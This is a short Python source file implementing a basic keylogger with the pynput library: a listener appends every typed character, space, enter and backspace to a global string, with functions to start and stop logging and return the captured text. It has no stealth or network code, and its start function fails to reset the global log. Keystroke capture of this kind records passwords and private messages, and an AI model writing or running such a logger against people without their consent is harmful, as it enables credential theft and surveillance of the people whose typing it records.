from pynput.keyboard import Listener, Key
import time
log =""

def on_press(key):
    global log
    
    if hasattr(key,"char") and key.char is not None:
        log+=key.char
    else:
        if key == Key.space:
            log += " "  
        elif key == Key.enter:
            log += " --\-- "  
        elif key == Key.backspace:
            log = log[:-1]                

listener =  Listener(on_press=on_press)

def start_logging():
    log =""
    print("started")
    listener.start()


def stop_logging():
    print("stopped")
    listener.stop()
    return log 

